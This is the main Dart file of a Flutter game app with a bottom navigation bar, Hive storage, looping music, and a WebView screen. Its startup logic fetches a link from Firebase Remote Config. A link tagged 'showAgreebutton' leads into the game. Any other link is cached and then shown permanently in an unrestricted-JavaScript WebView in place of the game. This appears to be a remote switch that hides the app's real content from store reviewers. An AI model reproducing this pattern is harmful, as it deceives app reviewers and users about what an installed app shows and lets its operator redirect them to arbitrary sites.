import 'dart:developer';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:flutter_svg/svg.dart';
import 'package:game/firebase_options.dart';
import 'package:game/hive/boxes.dart';
import 'package:game/hive/model/game_model.dart';
import 'package:game/hive/model/reserv_model.dart';
import 'package:game/home_page.dart';
import 'package:game/info_page.dart';
import 'package:game/list_game_page.dart';
import 'package:game/reserv_game_page.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:provider/provider.dart';
import 'package:webview_flutter/webview_flutter.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await Hive.initFlutter();
  await Hive.openBox("privacyLink");
  await Hive.openBox('settings');
  Hive.registerAdapter(GameModelAdapter());
  Hive.registerAdapter(ReservModelAdapter());
  await Hive.openBox<GameModel>(HiveBoxes.gameModel);
  await Hive.openBox<ReservModel>(HiveBoxes.reservModel);

  SystemChrome.setSystemUIOverlayStyle(
      const SystemUiOverlayStyle(statusBarColor: Colors.black));
  await _initializeRemoteConfig().then((onValue) {
    runApp(MyApp(
      link: onValue,
    ));
  });
}

Future<String> _initializeRemoteConfig() async {
  final remoteConfig = FirebaseRemoteConfig.instance;
  var box = await Hive.openBox('privacyLink');
  String link = '';

  if (box.isEmpty) {
    await remoteConfig.setConfigSettings(RemoteConfigSettings(
      fetchTimeout: const Duration(minutes: 1),
      minimumFetchInterval: const Duration(minutes: 1),
    ));

    try {
      bool updated = await remoteConfig.fetchAndActivate();
      log("Remote Config Update Status: $updated");

      link = remoteConfig.getString("link");

      log("Fetched link: $link");
    } catch (e) {
      log("Failed to fetch remote config: $e");
    }
  } else {
    if (box.get('link').contains("showAgreebutton")) {
      await remoteConfig.setConfigSettings(RemoteConfigSettings(
        fetchTimeout: const Duration(minutes: 1),
        minimumFetchInterval: const Duration(minutes: 1),
      ));

      try {
        bool updated = await remoteConfig.fetchAndActivate();
        log("Remote Config Update Status: $updated");

        link = remoteConfig.getString("link");
        log("Fetched link: $link");
      } catch (e) {
        log("Failed to fetch remote config: $e");
      }
      if (!link.contains("showAgreebutton")) {
        box.put('link', link);
      }
    } else {
      link = box.get('link');
    }
  }

  return link == ""
      ? "https://telegra.ph/MediaMap-Your-Statistics-Privacy-Policy-11-13?showAgreebutton"
      : link;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key, required this.link});
  final String link;
  @override
  Widget build(BuildContext context) {
    return ScreenUtilInit(
        designSize: const Size(400, 844),
        minTextAdapt: true,
        splitScreenMode: true,
        builder: (_, child) {
          return MaterialApp(
              title: 'Flutter Demo',
              debugShowCheckedModeBanner: false,
              // onGenerateRoute: NavigationApp.generateRoute,

              theme: ThemeData(
                scaffoldBackgroundColor: const Color(0xFFFFF1EC),
                appBarTheme: const AppBarTheme(
                    backgroundColor: Colors.transparent,
                    systemOverlayStyle: SystemUiOverlayStyle.dark),
              ),
              home: Hive.box("privacyLink").isEmpty
                  ? WebViewScreen(
                      link: link,
                    )
                  : Hive.box("privacyLink")
                          .get('link')
                          .contains("showAgreebutton")
                      ? ValueListenableBuilder<Box>(
                          valueListenable: Hive.box('settings').listenable(),
                          builder: (context, box, _) {
                            final themeProvider = ThemeProvider(box);
                            return ChangeNotifierProvider(
                                create: (_) => themeProvider,
                                child: Consumer<ThemeProvider>(
                                    builder: (context, provider, _) {
                                  return const MyHomePage();
                                }));
                          })
                      : WebViewScreen(
                          link: link,
                        ));
        });
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({
    super.key,
  });

  @override
  // ignore: library_private_types_in_public_api
  _MyHomePageState createState() => _MyHomePageState();
}

int currentIndex = 0;

class _MyHomePageState extends State<MyHomePage> {
  int visit = 0;
  late List<Widget> pages;

  @override
  void initState() {
    super.initState();
    // Initialize pages here
    pages = [
      HomePage(() {
        _onTabTapped(1); // Use the method to update the index
      }, () {
        _onTabTapped(2);
      }, () {
        _onTabTapped(3);
      }),
      const ListGamePage(),
      const ReservGamePage(),
      const InfoPage(),
    ];
  }

  void _onTabTapped(int index) {
    setState(() {
      currentIndex = index;
    });
  }

  List<String> iconName = [
    "Home",
    "Game",
    "Reserv",
    "Setting",
  ];
  List<String> assetsIcon = [
    "assets/home.svg",
    "assets/game.png",
    "assets/reserv.svg",
    "assets/setting.svg",
  ];
  List<Widget> icons = [
    SizedBox(
      height: 60.h,
      child: Column(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          SvgPicture.asset(
            "assets/home.svg",
            // ignore: deprecated_member_use
            color: const Color(0xFFBF5555),
            height: 24.h,
          ),
          Padding(
            padding: EdgeInsets.only(bottom: 4.h),
            child: Text(
              "Home",
              style: TextStyle(fontSize: 12.sp),
            ),
          )
        ],
      ),
    ),
    SizedBox(
      height: 60.h,
      child: Column(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Image(
            height: 24.h,
            fit: BoxFit.fitHeight,
            image: const AssetImage(
              "assets/game.png",
            ),
          ),
          Padding(
              padding: EdgeInsets.only(bottom: 4.h),
              child: Text(
                "Game",
                style: TextStyle(fontSize: 12.sp),
              ))
        ],
      ),
    ),
    SizedBox(
      height: 60.h,
      child: Column(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          SvgPicture.asset(
            "assets/reserv.svg",
            height: 24.h,
          ),
          Padding(
              padding: EdgeInsets.only(bottom: 4.h),
              child: Text(
                "Reserv",
                style: TextStyle(fontSize: 12.sp),
              ))
        ],
      ),
    ),
    SizedBox(
      height: 60.h,
      child: Column(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          SvgPicture.asset(
            height: 24.h,
            "assets/setting.svg",
          ),
          Padding(
              padding: EdgeInsets.only(bottom: 4.h),
              child: Text(
                "Setting",
                style: TextStyle(fontSize: 12.sp),
              ))
        ],
      ),
    ),
  ];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
        backgroundColor: currentIndex == 0 || currentIndex == 3
            ? const Color(0xFFF88D68)
            : null,
        body: Padding(
            padding: EdgeInsets.only(top: MediaQuery.paddingOf(context).top),
            child: pages[currentIndex]),
        bottomNavigationBar: Container(
          decoration: BoxDecoration(
              color: Colors.white,
              borderRadius: BorderRadius.only(
                topLeft: Radius.circular(10.r),
                topRight: Radius.circular(10.r),
              )),
          height: 75.h,
          child: Align(
            alignment: Alignment.topCenter,
            child: Padding(
              padding: EdgeInsets.symmetric(vertical: 5.h),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceAround,
                children: [
                  for (int i = 0; i < assetsIcon.length; i++) menuIcons(i)
                ],
              ),
            ),
          ),
        ));
  }

  Widget menuIcons(int i) {
    return GestureDetector(
      onTap: () {
        currentIndex = i;
        setState(() {});
      },
      child: SizedBox(
        height: 60.h,
        child: Column(
          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
          children: [
            i == 1
                ? Image(
                    height: 24.h,
                    color: currentIndex == i ? const Color(0xFFBF5555) : null,
                    fit: BoxFit.fitHeight,
                    image: const AssetImage(
                      "assets/game.png",
                    ),
                  )
                : SvgPicture.asset(
                    assetsIcon[i],
                    // ignore: deprecated_member_use
                    color: currentIndex == i ? const Color(0xFFBF5555) : null,
                    height: 24.h,
                  ),
            Padding(
              padding: EdgeInsets.only(bottom: 4.h),
              child: Text(
                iconName[i],
                style: TextStyle(
                  fontSize: 12.sp,
                  color: currentIndex == i ? const Color(0xFFBF5555) : null,
                ),
              ),
            )
          ],
        ),
      ),
    );
  }
}

class AudioPlayerSingleton {
  static final AudioPlayerSingleton _instance =
      AudioPlayerSingleton._internal();
  factory AudioPlayerSingleton() => _instance;

  final AudioPlayer player = AudioPlayer();

  AudioPlayerSingleton._internal() {
    _initialize();
  }

  void _initialize() async {
    await player.setReleaseMode(ReleaseMode.loop); // Looping the audio
    await player
        .setSource(AssetSource('le-gang-it-meant-everything-to-me.mp3'));
    await player.resume();
  }
}

class ThemeProvider extends ChangeNotifier {
  // Инициализация Hive box
  Box? settingsBox;

  // Используем late для отложенной инициализации переменной
  late bool _isDarkMode;

  ThemeProvider(this.settingsBox) {
    // Загружаем значение из Hive
    _isDarkMode = settingsBox?.get('isDarkMode', defaultValue: false) ?? false;
    settingsBox?.put('isDarkMode', _isDarkMode); // Сохраняем значение в Hive
    if (_isDarkMode == true) {
      AudioPlayerSingleton().player.resume();
    } else {
      AudioPlayerSingleton().player.stop();
    }
  }

  bool get isDarkMode => _isDarkMode;

  void toggleTheme() {
    _isDarkMode = !_isDarkMode;
    settingsBox?.put('isDarkMode', _isDarkMode); // Сохраняем значение в Hive
    if (_isDarkMode == true) {
      AudioPlayerSingleton().player.resume();
    } else {
      AudioPlayerSingleton().player.stop();
    }

    notifyListeners();
  }
}

class WebViewScreen extends StatefulWidget {
  const WebViewScreen({super.key, required this.link});
  final String link;

  @override
  State<WebViewScreen> createState() {
    return _WebViewScreenState();
  }
}

class _WebViewScreenState extends State<WebViewScreen> {
  bool loadAgree = false;
  WebViewController controller = WebViewController();

  @override
  void initState() {
    super.initState();
    if (Hive.box("privacyLink").isEmpty) {
      Hive.box("privacyLink").put('link', widget.link);
    }

    _initializeWebView(widget.link); // Initialize WebViewController
  }

  void _initializeWebView(String url) {
    controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setNavigationDelegate(
        NavigationDelegate(
          onProgress: (int progress) {
            if (progress == 100) {
              loadAgree = true;
              setState(() {});
            }
          },
          onPageStarted: (String url) {},
          onPageFinished: (String url) {},
          onHttpError: (HttpResponseError error) {},
          onWebResourceError: (WebResourceError error) {},
          onNavigationRequest: (NavigationRequest request) {
            if (request.url.startsWith('https://www.youtube.com/')) {
              return NavigationDecision.prevent;
            }
            return NavigationDecision.navigate;
          },
        ),
      )
      ..loadRequest(Uri.parse(url));
    setState(() {}); // Optional, if you want to trigger a rebuild elsewhere
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      body: Padding(
        padding: EdgeInsets.only(top: MediaQuery.paddingOf(context).top),
        child: Stack(children: [
          WebViewWidget(controller: controller),
          if (loadAgree)
            GestureDetector(
                onTap: () async {
                  var box = await Hive.openBox('privacyLink');
                  box.put('link', widget.link);
                  Navigator.push(
                    // ignore: use_build_context_synchronously
                    context,
                    MaterialPageRoute<void>(
                      builder: (BuildContext context) =>
                          ValueListenableBuilder<Box>(
                              valueListenable:
                                  Hive.box('settings').listenable(),
                              builder: (context, box, _) {
                                final themeProvider = ThemeProvider(box);
                                return ChangeNotifierProvider(
                                    create: (_) => themeProvider,
                                    child: Consumer<ThemeProvider>(
                                        builder: (context, provider, _) {
                                      return const MyHomePage();
                                    }));
                              }),
                    ),
                  );
                },
                child: widget.link.contains("showAgreebutton")
                    ? Align(
                        alignment: Alignment.bottomCenter,
                        child: Padding(
                          padding: const EdgeInsets.only(bottom: 20),
                          child: Container(
                            width: 200,
                            height: 60,
                            color: Colors.amber,
                            child: const Center(child: Text("AGREE")),
                          ),
                        ))
                    : null),
        ]),
      ),
    );
  }
}
